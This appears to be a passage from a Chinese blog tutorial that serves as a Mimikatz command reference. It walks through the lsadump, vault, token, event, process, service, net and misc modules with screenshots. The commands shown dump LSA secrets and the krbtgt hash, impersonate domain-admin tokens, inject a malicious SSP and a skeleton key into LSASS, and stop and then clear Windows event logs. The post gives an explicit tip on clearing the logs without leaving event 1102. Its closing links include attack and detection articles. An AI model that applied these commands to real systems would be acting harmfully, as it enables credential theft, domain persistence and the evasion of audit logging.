![](https://img-blog.csdnimg.cn/20201007164227651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**secrets**  


```text
lsadump::secrets
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007164335686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​。

**lsa：获取指定用户信息**

```text
lsadump::lsa
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007164615750.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


```text
lsadump::lsa /inject /name:krbtgt
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007164659821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**trust：检索域信任信息**

```text
lsadump::trust
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007164740768.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**dcsync**

**dcshadow**  


### \*\*\*\*[**vault**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-vault)\*\*\*\*

**list –列出存储的凭据**

```text
vault::list
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165134964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


### \*\*\*\*[**token**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token)\*\*\*\*

**elevate：模拟令牌。用于将权限提升为system（默认），或使用在windows api中找到域管理员令牌**  


```text
token::elevate
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165414837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


在框中找到一个域管理员凭据，然后使用该令牌  


```text
token::elevate /domainadmin
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165511541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**list：列出系统的所有令牌**

```text
token::list
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165620297.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**revert：恢复进程令牌**  


```text
token::revert
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165709538.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**run**  


```text
token::run
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165738564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**whoami:显示当前身份**  


```text
token::whoami
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165805434.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


### \*\*\*\*[**event**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-event)\*\*\*\*

**clear:清除事件日志**  


```text
event::clear
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007165949689.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**drop：停止事件日志服务**  


```text
event:::drop
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007170120912.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**注意：**  


先运行privilege :: debug，然后运行event :: drop来修补事件日志。然后运行event :: clear以清除事件日志，从而不记录任何日志清除事件（1102）。

### \*\*\*\*[**ts**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-ts)\*\*\*\*

**sessions：列出TS / RDP会话**  


```text
ts::sessions
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/2020100717035392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

### \*\*\*\*[**process**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-process)\*\*\*\*

提供了收集进程数据并与进程进行交互的能力  


**exports：出口清单**  


```text
process::exports
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/2020100717062447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**imports：进口清单**  


```text
process::imports
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/20201007170745931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

**list:列出正在运行的进程,需要管理员权限。**

```text
process::list
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007170834952.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**resume:恢复进程**  


```text
process::resume /pid:进程PID号
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**run:运行指定程序**

```text
process::run xxx.exe
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007171052546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


 **start：启动一个进程**  


```text
process::start 
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**stop：终止一个进程**  


```text
process::stop
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**suspend：挂起一个进程**  


```text
process::suspend
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

### \*\*\*\*[**service**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-service)\*\*\*\*

service::+ 安装Mimikatz服务（'mimikatzsvc'）  


![](https://img-blog.csdnimg.cn/20201007171518191.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**SERVICE::-**   卸载Mimikatz服务（'mimikatzsvc'）

![](https://img-blog.csdnimg.cn/20201007171541878.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


> service::list \\服务列表  
> service::me \\我的服务  
> service::preshutdown \\关机前关闭服务  
> service::remove \\删除服务  
> service::resume \\恢复服务  
> service::shutdown \\关闭服务  
> service::start \\启动服务  
> service::stop \\停止服务  
> service::suspend \\挂起服务

### \*\*\*\*[**net**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-net)\*\*\*\*

```text
net::alias
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007172125129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  
  


```text
net::group
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/2020100717214380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  
  


```text
net::serverinfo
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007172155810.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  
  


```text
net::session
net::share
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007172211743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  
  


```text
net::stats
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/2020100717222245.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  
  


```text
net::tod
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007172236139.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  
  


```text
net::user
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007172254716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  
  


```text
net::wsession
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007172306918.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


### \*\*\*\*[**misc**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-misc)\*\*\*\*

cmd:打开一个新命令行。_需要管理员权限_  


```text
misc::cmd
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007172901468.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


detours:枚举带有类似Detours的钩子的所有模块,需要管理员权限

```text
misc::detours
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007173126636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


memssp:通过在内存中使用恶意的Windows SSP注入LSASS，以记录本地身份验证的凭据–无需重新启动（重新启动将清除memssp Mimikatz注入）  


```text
misc::memssp
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/2020100717315788.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


mflt：收集有关已加载驱动程序的详细信息  


```text
misc::mflt
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007173338931.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


打开注册表  


```text
misc::regedit
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

使用mimikatz万能钥匙注入到lsass进程中

```text
misc::skeleton
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007173455914.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


打开进程管理器

```text
misc::taskmgr
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

## ​​​​​​​关于AD渗透中利用Mimikatz的国内外优秀文章

* [Mimikatz和Active Directory Kerberos攻击](https://adsecurity.org/?p=556)
* [使用Mimikatz DCSync转储域中所有管理员的明文密码](https://adsecurity.org/?p=2053)
* [攻击者如何使用Kerberos Silver Ticket来利用系统](https://adsecurity.org/?p=2011)
* [Mimikatz DCSync的使用，开发和检测](https://adsecurity.org/?p=1729)
* [Active Directory持久性潜伏＃12：恶意安全支持提供程序（SSP）](https://adsecurity.org/?p=1760)
* [Active Directory持久性偷偷摸摸的11：目录服务还原模式（DSRM）](https://adsecurity.org/?p=1714)
* [Kerberos金票现在更金](https://adsecurity.org/?p=1640)
* [与信任有关的一切–伪造Kerberos信任票证以欺骗跨Active Directory信任的访问](https://adsecurity.org/?p=1588)
* [检测Mimikatz的使用](https://adsecurity.org/?p=1567)

